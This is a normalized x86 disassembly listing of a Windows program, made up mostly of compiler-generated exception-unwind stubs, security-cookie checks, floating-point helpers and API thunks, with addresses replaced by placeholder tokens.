lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0x7
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_421de0
sub_424cb5
push 0xc
call sub_41ae9a
pop ecx
retn
sub_425350
push 0xc
call sub_41ae9a
pop ecx
retn
sub_42535f
push 0xc
call sub_41ae9a
pop ecx
retn
sub_425392
and [ esi + 0x70 ] 0xffffffef
retn
sub_425bdc
and [ rw-data ] 0x0
retn
sub_425c25
push sub_425be4
call sub_41ca43
pop ecx
xor eax eax
retn
sub_4260a9
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_4264c7
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4263eb
add esp 0x18
pop ebp
retn
sub_426b4f
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
neg eax
sbb eax eax
and eax 0x1
pop ebp
retn
sub_427199
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
cmp [ eax ] 0xc0000005
je r-xdata
xor eax eax
inc eax
retn
cmp [ eax ] 0xc000001d
je r-xdata
xor eax eax
retn
sub_4271e0
push ebp
mov ebp esp
push ecx
fnstsw [ ebp - 0x4 ]
fnclex
movsx eax [ ebp - 0x4 ]
leave
retn
sub_42726e
push ebp
mov ebp esp
push ecx
fwait
fnstsw [ ebp - 0x4 ]
movsx eax [ ebp - 0x4 ]
leave
retn
sub_427745
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4278b2
add esp 0x18
pop ebp
retn
sub_427c24
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_427c35
pop ecx
pop ecx
pop ebp
retn
sub_427cb3
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_427ccb
add esp 0x10
pop ebp
retn
sub_427d0b
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_427d1c
pop ecx
pop ecx
pop ebp
retn
sub_427e2d
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_427df7
pop ecx
pop ecx
pop ebp
retn
sub_427ff9
mov [ ebp - 0x90 ] 0x1
or cl cl
retn
sub_428003
or cl cl
je r-xdata
retn
fchs
sub_428070
fld st0
frndint
fsubr st1
fxch st1
fchs
f2xm1
fld1
faddp st1
fscale
fstp st1
retn
sub_428085
mov edx [ esp + 0x4 ]
and edx 0x300
or edx 0x7f
mov [ esp + 0x6 ] dx
fldcw [ esp + 0x6 ]
retn
sub_42809c
test eax 0x80000
je r-xdata
fadd [ r--data ]
mov eax 0x1
retn
mov eax 0x7
retn
sub_4280f8
mov eax [ esp + 0x8 ]
and eax 0x7ff00000
cmp eax 0x7ff00000
je r-xdata
mov eax [ esp + 0x8 ]
retn
retn
sub_428d97
push ebp
mov ebp esp
push 0x1
push [ ebp + 0x8 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_42857f
add esp 0x18
pop ebp
retn
sub_429089
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_428fc0
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_4290d4
call eax
retn
sub_42a0d2
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_429fdf
add esp 0x10
pop ebp
retn
sub_42a208
push 0xa
call sub_41ae9a
pop ecx
retn
sub_42a2e5
push 0xa
call sub_41ae9a
pop ecx
retn
sub_42a3ad
push 0xb
call sub_41ae9a
pop ecx
retn
sub_42a89f
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42a77d
add esp 0x14
pop ebp
retn
sub_42a8ba
push 0x2
call sub_4186ea
sub_42a9d6
push ebp
mov ebp esp
push 0x1
push [ ebp + 0x8 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_42a8c3
add esp 0x18
pop ebp
retn
sub_42a9f4
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42aa0c
add esp 0x10
pop ebp
retn
sub_42ab21
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42ab39
add esp 0x10
pop ebp
retn
sub_42d039
xor eax eax
retn
sub_42d9d0
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
retn
cmp eax 0xfffffffe
je r-xdata
push eax
call [ CloseHandle@IAT ]
sub_42d9e7
xor eax eax
push eax
push eax
push 0x3
push eax
push 0x3
push 0x40000000
push r--data
call [ CreateFileW@IAT ]
mov [ rw-data ] eax
retn
IsProcessorFeaturePresent
jmp [ IsProcessorFeaturePresent@IAT ]
RtlUnwind
jmp [ RtlUnwind@IAT ]
sub_430180
lea ecx [ ebp - 0x10 ]
jmp sub_41691d
sub_430188
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_4170bc
mov eax r--data
jmp sub_41ad00
sub_4301a3
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_4170bc
mov eax r--data
jmp sub_41ad00
sub_4301c0
lea ecx [ ebp - 0x28 ]
jmp sub_401490
sub_4301c8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x64 ]
xor ecx eax
call sub_4170bc
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_4170bc
mov eax r--data
jmp sub_41ad00
sub_4301f0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_4170bc
mov eax r--data
jmp sub_41ad00
sub_430210
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_4170bc
mov eax r--data
jmp sub_41ad00
sub_430230
lea ecx [ ebp - 0x30 ]
jmp sub_409010
sub_430240
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x74 ]
xor ecx eax
call sub_4170bc
mov eax r--data
jmp sub_41ad00
sub_430260
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp - 0x18 ]
jmp sub_401490
sub_430279
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_4170bc
mov eax r--data
jmp sub_41ad00
sub_4302a0
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp - 0x14 ]
jmp sub_401490
sub_4302b9
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_4170bc
mov eax r--data
jmp sub_41ad00
sub_4302e0
lea ecx [ ebp - 0x18 ]
jmp sub_41691d
sub_4302e8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_4170bc
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_4170bc
mov eax r--data
jmp sub_41ad00
sub_430310
mov ecx [ ebp - 0x14 ]
jmp sub_40d0d0
sub_430318
mov ecx [ ebp - 0x14 ]
add ecx 0x8
jmp sub_40d150
sub_430323
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4170bc
mov eax r--data
jmp sub_41ad00
sub_430340
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp - 0x14 ]
add ecx 0x70
jmp sub_40b4f0
sub_43035c
mov ecx [ ebp - 0x14 ]
add ecx 0x18
jmp sub_40b500
sub_430367
mov ecx [ ebp - 0x14 ]
add ecx 0x10
jmp sub_40bbf0
sub_430372
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_4170bc
mov eax r--data
jmp sub_41ad00
sub_430390
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp - 0x14 ]
add ecx 0x60
jmp sub_40b4f0
sub_4303ac
mov ecx [ ebp - 0x14 ]
add ecx 0x8
jmp sub_40b250
sub_4303b7
mov ecx [ ebp - 0x14 ]
add ecx 0x4
jmp sub_40bbf0
sub_4303c2
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_4170bc
mov eax r--data
jmp sub_41ad00
sub_4303e0
lea ecx [ ebp - 0x3c ]
jmp sub_408000
sub_4303e8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x54 ]
xor ecx eax
call sub_4170bc
mov eax r--data
jmp sub_41ad00
sub_430410
mov ecx [ ebp - 0x18 ]
jmp sub_41691d
sub_430418
mov ecx [ ebp - 0x18 ]
add ecx 0x4
jmp sub_40b230
sub_430423
mov ecx [ ebp - 0x18 ]
add ecx 0xc
jmp sub_40b230
sub_43042e
mov ecx [ ebp - 0x18 ]
add ecx 0x14
jmp sub_40b230
sub_430439
mov ecx [ ebp - 0x18 ]
add ecx 0x1c
jmp sub_40b230
sub_430444
mov ecx [ ebp - 0x18 ]
add ecx 0x24
jmp sub_40b230
sub_43044f
mov ecx [ ebp - 0x18 ]
add ecx 0x2c
jmp sub_40b230
sub_43045a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_4170bc
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_4170bc
mov eax r--data
jmp sub_41ad00
sub_430480
lea ecx [ ebp - 0x24 ]
jmp sub_401490
sub_430488
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2c ]
xor ecx eax
call sub_4170bc
mov eax r--data
jmp sub_41ad00
sub_4304b0
lea ecx [ ebp - 0x34 ]
jmp sub_401490
sub_4304b8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_4170bc
mov eax r--data
jmp sub_41ad00
sub_4304e0
push sub_401490
push 0x80
push 0x18
lea eax [ ebp - 0xc10 ]
push eax
call sub_41911b
retn
sub_4304f9
lea ecx [ ebp - 0xc28 ]
jmp sub_401490
sub_430504
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc64 ]
xor ecx eax
call sub_4170bc
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_4170bc
mov eax r--data
jmp sub_41ad00
sub_430530
lea ecx [ ebp - 0xc0 ]
jmp sub_40ac70
sub_43053b
lea ecx [ ebp - 0x58 ]
jmp sub_401490
sub_430543
lea ecx [ ebp - 0x70 ]
jmp sub_401490
sub_43054b
lea ecx [ ebp - 0x110 ]
jmp sub_408000
sub_430556
lea ecx [ ebp - 0x40 ]
jmp sub_401490
sub_43055e
lea ecx [ ebp - 0xe0 ]
jmp sub_408000
sub_430569
lea ecx [ ebp - 0xe0 ]
jmp sub_408000
sub_430574
lea ecx [ ebp - 0xe0 ]
jmp sub_408000
sub_43057f
lea ecx [ ebp - 0xe0 ]
jmp sub_401490
sub_43058a
lea ecx [ ebp - 0xf8 ]
jmp sub_401490
sub_430595
lea ecx [ ebp - 0x28 ]
jmp sub_401490
sub_43059d
lea ecx [ ebp - 0x88 ]
jmp sub_401490
sub_4305a8
lea ecx [ ebp - 0x128 ]
jmp sub_401490
sub_4305b3
lea ecx [ ebp - 0x110 ]
jmp sub_401490
sub_4305be
lea ecx [ ebp - 0xf8 ]
jmp sub_401490
sub_4305c9
lea ecx [ ebp - 0x128 ]
jmp sub_401490
sub_4305d4
lea ecx [ ebp - 0xf8 ]
jmp sub_401490
sub_4305df
lea ecx [ ebp - 0x128 ]
jmp sub_401490
sub_4305ea
lea ecx [ ebp - 0xf8 ]
jmp sub_401490
sub_4305f5
lea ecx [ ebp - 0xa0 ]
jmp sub_401490
sub_430600
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x12c ]
xor ecx eax
call sub_4170bc
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_4170bc
mov eax r--data
jmp sub_41ad00
sub_430630
lea ecx [ ebp - 0x440 ]
jmp sub_408000
sub_43063b
lea ecx [ ebp - 0x4f8 ]
jmp sub_409750
sub_430646
lea ecx [ ebp - 0x428 ]
jmp sub_401490
sub_430651
lea ecx [ ebp - 0x4fc ]
jmp sub_408b10
sub_43065c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x51c ]
xor ecx eax
call sub_4170bc
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_4170bc
mov eax r--data
jmp sub_41ad00
sub_430690
lea ecx [ ebp - 0x1a28 ]
jmp sub_401490
sub_43069b
push sub_409c80
push 0x80
push 0x34
lea eax [ ebp - 0x1a10 ]
push eax
call sub_41911b
retn
sub_4306b4
mov ecx [ ebp - 0x1abc ]
add ecx 0x4
jmp sub_401490
sub_4306c2
lea ecx [ ebp - 0x1a40 ]
jmp sub_408000
sub_4306cd
lea ecx [ ebp - 0x1aa0 ]
jmp sub_408000
sub_4306d8
lea ecx [ ebp - 0x1ab8 ]
jmp sub_401490
sub_4306e3
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1ac4 ]
xor ecx eax
call sub_4170bc
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_4170bc
mov eax r--data
jmp sub_41ad00
sub_430710
lea ecx [ ebp - 0xd8 ]
jmp sub_408000
sub_43071b
lea ecx [ ebp - 0xc0 ]
jmp sub_409ac0
sub_430726
mov edx [ esp + 0x8 ]
lea eax [ edx - 0xdc ]
mov ecx [ edx - 0xe0 ]
xor ecx eax
call sub_4170bc
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_4170bc
mov eax r--data
jmp sub_41ad00
sub_430760
lea ecx [ ebp - 0x2c ]
jmp sub_401490
sub_430768
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x34 ]
mov ecx [ edx - 0x38 ]
xor ecx eax
call sub_4170bc
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_4170bc
mov eax r--data
jmp sub_41ad00
sub_430790
mov eax [ ebp + 0x8 ]
push eax
call j_sub_417912#2
pop ecx
retn
sub_43079b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x48 ]
xor ecx eax
call sub_4170bc
mov eax r--data
jmp sub_41ad00
sub_4307c0
mov eax [ ebp + 0x8 ]
push eax
call j_sub_417912#2
pop ecx
retn
sub_4307cb
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x5c ]
xor ecx eax
call sub_4170bc
mov eax r--data
jmp sub_41ad00
sub_4307f0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_4170bc
mov eax r--data
jmp sub_41ad00
sub_430810
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_4170bc
mov eax r--data
jmp sub_41ad00
sub_430830
lea ecx [ ebp - 0x18 ]
jmp sub_409010
sub_430838
lea ecx [ ebp - 0x18 ]
jmp sub_40d770
sub_430840
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x14 ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_4170bc
mov eax r--data
jmp sub_41ad00
sub_430860
lea ecx [ ebp - 0x2c ]
jmp sub_409010
sub_430868
lea ecx [ ebp - 0x2c ]
jmp sub_409010
sub_430870
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x34 ]
xor ecx eax
call sub_4170bc
mov eax r--data
jmp sub_41ad00
sub_430890
lea ecx [ ebp + 0x8 ]
jmp sub_408b10
sub_430898
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_4170bc
mov eax r--data
jmp sub_41ad00
sub_4308c0
lea ecx [ ebp + 0xc ]
jmp sub_408b10
sub_4308c8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_4170bc
mov eax r--data
jmp sub_41ad00
sub_4308f0
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call sub_401000
add esp 0x8
retn
sub_430901
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_4170bc
mov eax r--data
jmp sub_41ad00
sub_430920
lea ecx [ ebp - 0x20 ]
jmp sub_409010
sub_430928
lea ecx [ ebp - 0x20 ]
jmp sub_40d770
sub_430930
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x28 ]
xor ecx eax
call sub_4170bc
mov eax r--data
jmp sub_41ad00
sub_430950
lea ecx [ ebp - 0x2c ]
jmp sub_401490
sub_430958
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x3c ]
mov ecx [ edx - 0x40 ]
xor ecx eax
call sub_4170bc
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_4170bc
mov eax r--data
jmp sub_41ad00
sub_430980
lea ecx [ ebp - 0xccb8 ]
jmp sub_408000
sub_43098b
lea ecx [ ebp - 0xcc9c ]
jmp sub_401490
sub_430996
lea ecx [ ebp - 0xccd4 ]
jmp sub_401490
sub_4309a1
lea ecx [ ebp - 0xcc84 ]
jmp sub_401490
sub_4309ac
lea ecx [ ebp - 0xcc84 ]
jmp sub_401490
sub_4309b7
lea ecx [ ebp - 0xcc84 ]
jmp sub_401490
sub_4309c2
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xcd70 ]
xor ecx eax
call sub_4170bc
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_4170bc
mov eax r--data
jmp sub_41ad00
sub_4309f0
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp - 0x3c ]
jmp sub_401490
sub_430a09
mov eax [ ebp - 0x10 ]
and eax 0x2
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0x38 ]
jmp sub_401490
sub_430a22
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x44 ]
xor ecx eax
call sub_4170bc
mov eax r--data
jmp sub_41ad00
sub_430a40
mov ecx [ ebp - 0x14 ]
jmp sub_4101d0
sub_430a48
mov ecx [ ebp - 0x14 ]
add ecx 0x8
jmp sub_40d150
sub_430a53
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4170bc
mov eax r--data
jmp sub_41ad00
sub_430a70
lea ecx [ ebp + 0x14 ]
jmp sub_401490
sub_430a78
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1b8 ]
xor ecx eax
call sub_4170bc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_4170bc
mov eax r--data
jmp sub_41ad00
sub_430aa0
lea ecx [ ebp - 0x294 ]
jmp sub_408000
sub_430aab
lea ecx [ ebp - 0x260 ]
jmp sub_408000
sub_430ab6
lea ecx [ ebp - 0x27c ]
jmp sub_408000
sub_430ac1
lea ecx [ ebp - 0x248 ]
jmp sub_408000
sub_430acc
lea ecx [ ebp - 0x230 ]
jmp sub_408000
sub_430ad7
lea ecx [ ebp - 0x27c ]
jmp sub_408000
sub_430ae2
lea ecx [ ebp - 0x27c ]
jmp sub_408000
sub_430aed
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x29c ]
xor ecx eax
call sub_4170bc
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_4170bc
mov eax r--data
jmp sub_41ad00
sub_430b20
lea ecx [ ebp - 0x2c ]
jmp sub_401490
sub_430b28
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x38 ]
xor ecx eax
call sub_4170bc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_4170bc
mov eax r--data
jmp sub_41ad00
sub_430b50
lea ecx [ ebp - 0x2c ]
jmp sub_401490
sub_430b58
lea ecx [ ebp - 0x44 ]
jmp sub_401490
sub_430b60
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x48 ]
xor ecx eax
call sub_4170bc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_4170bc
mov eax r--data
jmp sub_41ad00
sub_430b90
lea ecx [ ebp - 0x2c ]
jmp sub_408000
sub_430b98
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x38 ]
xor ecx eax
call sub_4170bc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_4170bc
mov eax r--data
jmp sub_41ad00
sub_430bc0
lea ecx [ ebp - 0x7d488 ]
jmp sub_408000
sub_430bcb
lea ecx [ ebp - 0x7d4a0 ]
jmp sub_401490
sub_430bd6
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x7d53c ]
xor ecx eax
call sub_4170bc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_4170bc
mov eax r--data
jmp sub_41ad00
sub_430c00
lea ecx [ ebp - 0x9c ]
jmp sub_401490
sub_430c0b
lea ecx [ ebp - 0x6c ]
jmp sub_401490
sub_430c13
lea ecx [ ebp - 0xe8 ]
jmp sub_401490
sub_430c1e
lea ecx [ ebp - 0xcc ]
jmp sub_408000
sub_430c29
lea ecx [ ebp - 0x84 ]
jmp sub_401490
sub_430c34
lea ecx [ ebp - 0x104 ]
jmp sub_401490
sub_430c3f
lea ecx [ ebp - 0xe8 ]
jmp sub_401490
sub_430c4a
lea ecx [ ebp - 0xb4 ]
jmp sub_401490
sub_430c55
lea ecx [ ebp - 0xe8 ]
jmp sub_401490
sub_430c60
lea ecx [ ebp - 0x104 ]
jmp sub_401490
sub_430c6b
lea ecx [ ebp - 0xe8 ]
jmp sub_401490
sub_430c76
lea ecx [ ebp - 0x104 ]
jmp sub_401490
sub_430c81
lea ecx [ ebp - 0xe8 ]
jmp sub_401490
sub_430c8c
lea ecx [ ebp - 0x104 ]
jmp sub_401490
sub_430c97
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x110 ]
xor ecx eax
call sub_4170bc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_4170bc
mov eax r--data
jmp sub_41ad00
sub_430cc0
mov eax [ ebp - 0xbc ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0xbc ] 0xfffffffe
mov ecx [ ebp - 0xf0 ]
jmp sub_408000
sub_430ce2
lea ecx [ ebp - 0x70 ]
jmp sub_408000
sub_430cea
lea ecx [ ebp - 0x58 ]
jmp sub_408000
sub_430cf2
lea ecx [ ebp - 0x40 ]
jmp sub_408000
sub_430cfa
lea ecx [ ebp - 0x88 ]
jmp sub_408000
sub_430d05
lea ecx [ ebp - 0xb8 ]
jmp sub_408000
sub_430d10
lea ecx [ ebp - 0xa0 ]
jmp sub_408000
sub_430d1b
lea ecx [ ebp - 0xa0 ]
jmp sub_408000
sub_430d26
lea ecx [ ebp - 0x88 ]
jmp sub_408000
sub_430d31
lea ecx [ ebp - 0xd4 ]
jmp sub_408000
sub_430d3c
lea ecx [ ebp - 0xec ]
jmp sub_408000
sub_430d47
lea ecx [ ebp - 0x108 ]
jmp sub_408000
sub_430d52
lea ecx [ ebp - 0xb8 ]
jmp sub_408000
sub_430d5d
lea ecx [ ebp - 0xec ]
jmp sub_408000
sub_430d68
lea ecx [ ebp - 0xd4 ]
jmp sub_408000
sub_430d73
lea ecx [ ebp - 0x88 ]
jmp sub_408000
sub_430d7e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10c ]
xor ecx eax
call sub_4170bc
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_4170bc
mov eax r--data
jmp sub_41ad00
sub_430db0
lea ecx [ ebp - 0x5dc ]
jmp sub_4116e0
sub_430dbb
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x5ec ]
xor ecx eax
call sub_4170bc
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_4170bc
mov eax r--data
jmp sub_41ad00
sub_430df0
lea ecx [ ebp - 0x5c0 ]
jmp sub_4116e0
sub_430dfb
lea ecx [ ebp - 0x5dc ]
jmp sub_408000
sub_430e06
lea ecx [ ebp - 0x5dc ]
jmp sub_408000
sub_430e11
mov eax [ ebp - 0x5f8 ]
and eax 0x4
je r-xdata
retn
and [ ebp - 0x5f8 ] 0xfffffffb
lea ecx [ ebp - 0x5dc ]
jmp sub_408000
sub_430e33
mov eax [ ebp - 0x5f8 ]
and eax 0x8
je r-xdata
retn
and [ ebp - 0x5f8 ] 0xfffffff7
lea ecx [ ebp - 0x5f4 ]
jmp sub_408000
sub_430e55
mov eax [ ebp - 0x5f8 ]
and eax 0x10
je r-xdata
retn
and [ ebp - 0x5f8 ] 0xffffffef
lea ecx [ ebp - 0x614 ]
jmp sub_408000
sub_430e77
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x618 ]
xor ecx eax
call sub_4170bc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_4170bc
mov eax r--data
jmp sub_41ad00
sub_430ea0
lea ecx [ ebp - 0x110 ]
jmp sub_408000
sub_430eab
lea ecx [ ebp - 0xc8 ]
jmp sub_408000
sub_430eb6
lea ecx [ ebp - 0xf8 ]
jmp sub_408000
sub_430ec1
lea ecx [ ebp - 0xe0 ]
jmp sub_408000
sub_430ecc
lea ecx [ ebp - 0xb0 ]
jmp sub_408000
sub_430ed7
lea ecx [ ebp - 0x98 ]
jmp sub_4116e0
sub_430ee2
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x124 ]
xor ecx eax
call sub_4170bc
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_4170bc
mov eax r--data
jmp sub_41ad00
sub_430f10
lea ecx [ ebp - 0x3c ]
jmp sub_408000
sub_430f18
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x3c ]
mov ecx [ edx - 0x40 ]
xor ecx eax
call sub_4170bc
add eax 0x8
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_4170bc
mov eax r--data
jmp sub_41ad00
sub_430f40
lea ecx [ ebp - 0x4a0 ]
jmp sub_401490
sub_430f4b
lea ecx [ ebp - 0x50 ]
jmp sub_401490
sub_430f53
lea ecx [ ebp - 0x6c8 ]
jmp sub_401490
sub_430f5e
lea ecx [ ebp - 0x488 ]
jmp sub_401490
sub_430f69
lea ecx [ ebp - 0x50 ]
jmp sub_401490
sub_430f71
lea ecx [ ebp - 0x6c8 ]
jmp sub_401490
sub_430f7c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x6cc ]
xor ecx eax
call sub_4170bc
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_4170bc
mov eax r--data
jmp sub_41ad00
sub_430fb0
lea ecx [ ebp - 0x28 ]
jmp sub_401490
sub_430fb8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x3c ]
xor ecx eax
call sub_4170bc
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_4170bc
mov eax r--data
jmp sub_41ad00
sub_430fe0
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp - 0x14 ]
jmp sub_408000
sub_430ff9
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_4170bc
mov eax r--data
jmp sub_41ad00
sub_431020
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp - 0x18 ]
jmp sub_408000
sub_431039
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_4170bc
mov eax r--data
jmp sub_41ad00
sub_431060
push sub_431220
call sub_4178d3
pop ecx
retn
sub_431070
push sub_431210
call sub_4178d3
pop ecx
retn
sub_431080
push sub_431200
call sub_4178d3
pop ecx
retn
sub_4310c0
call sub_40b990
push sub_4312c0
call sub_4178d3
pop ecx
retn
sub_4310e0
push sub_401490
push sub_40b120
